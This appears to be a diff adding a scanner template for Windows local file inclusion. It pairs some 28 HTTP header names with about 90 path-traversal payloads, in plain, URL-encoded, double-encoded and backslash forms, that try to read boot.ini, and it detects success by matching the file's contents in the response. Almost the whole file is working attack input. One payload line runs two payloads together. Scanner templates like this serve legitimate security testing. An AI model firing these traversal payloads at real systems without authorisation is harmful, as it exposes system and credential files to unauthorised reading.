@@ -1,0 +1,133 @@
+id: lfi-01
+type: fuzz
+level: 2
+info:
+  name: LFI on Path Windows
+  risk: High
+
+variables:
+  - head: |
+      User-Agent
+      Referer
+      Host
+      Origin
+      Authorization
+      X-Forwarded
+      X-Forwarded-By
+      X-Forwarded-For
+      Accept
+      Accept-Ranges
+      Access-Token
+      Action
+      Admin
+      Ajax
+      Allow
+      Auth
+      Auth-Basic
+      Cookie
+      Connection
+      Forwarded
+      HTTP2-Settings
+      X-Original-Url
+      X-Original-User-Agent
+      X-Originating-Ip
+      TE
+      Trailer
+      Transfer-Encoding
+      Via
+
+payloads:
+    - '../boot.ini'
+    - '../../boot.ini'
+    - '../../../boot.ini'
+    - '../../../../boot.ini'
+    - '../../../../../boot.ini'
+    - '../../../../../../boot.ini'
+    - '../../../../../../../boot.ini'
+    - '../../../../../../../../boot.ini'
+    - '..%2fboot.ini'
+    - '..%2f..%2fboot.ini'
+    - '..%2f..%2f..%2fboot.ini'
+    - '..%2f..%2f..%2f..%2fboot.ini'
+    - '..%2f..%2f..%2f..%2f..%2fboot.ini'
+    - '..%2f..%2f..%2f..%2f..%2f..%2fboot.ini'
+    - '..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini'
+    - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini'
+    - '%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini'
+    - '%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini'
+    - '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini'
+    - '..%252fboot.ini'
+    - '..%252f..%252fboot.ini'
+    - '..%252f..%252f..%252fboot.ini'
+    - '..%252f..%252f..%252f..%252fboot.ini'
+    - '..%252f..%252f..%252f..%252f..%252fboot.ini'
+    - '..%252f..%252f..%252f..%252f..%252f..%252fboot.ini'
+    - '..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini'
+    - '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini'
+    - '%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini'
+    - '%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini'
+    - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini'
+    - '..\boot.ini'
+    - '..\..\boot.ini'
+    - '..\..\..\boot.ini'
+    - '..\..\..\..\boot.ini'
+    - '..\..\..\..\..\boot.ini'
+    - '..\..\..\..\..\..\boot.ini'
+    - '..\..\..\..\..\..\..\boot.ini'
+    - '..\..\..\..\..\..\..\..\boot.ini'
+    - '..%255cboot.ini'
+    - '..%255c..%255cboot.ini'
+    - '..%255c..%255c..%255cboot.ini'
+    - '..%255c..%255c..%255c..%255cboot.ini'
+    - '..%255c..%255c..%255c..%255c..%255cboot.ini'
+    - '..%255c..%255c..%255c..%255c..%255c..%255cboot.ini'
+    - '..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini'
+    - '..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini'
+    - '%252e%252e\boot.ini'
+    - '%252e%252e\%252e%252e\boot.ini..%5cboot.ini'
+    - '..%5c..%5cboot.ini'
+    - '..%5c..%5c..%5cboot.ini'
+    - '..%5c..%5c..%5c..%5cboot.ini'
+    - '..%5c..%5c..%5c..%5c..%5cboot.ini'
+    - '..%5c..%5c..%5c..%5c..%5c..%5cboot.ini'
+    - '..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini'
+    - '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini'
+    - '%2e%2e\boot.ini'
+    - '%2e%2e\%2e%2e\boot.ini'
+    - '%2e%2e\%2e%2e\%2e%2e\boot.ini'
+    - '%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini'
+    - '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini'
+    - '%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini'
+
+requests:
+  - generators:
+      - Header("{{.payload}}", "{{.head}}")
+    detections:
+      - >-
+        StatusCode() == 200 && RegexSearch("response", "root:|for 16-bit app support|boot loader")
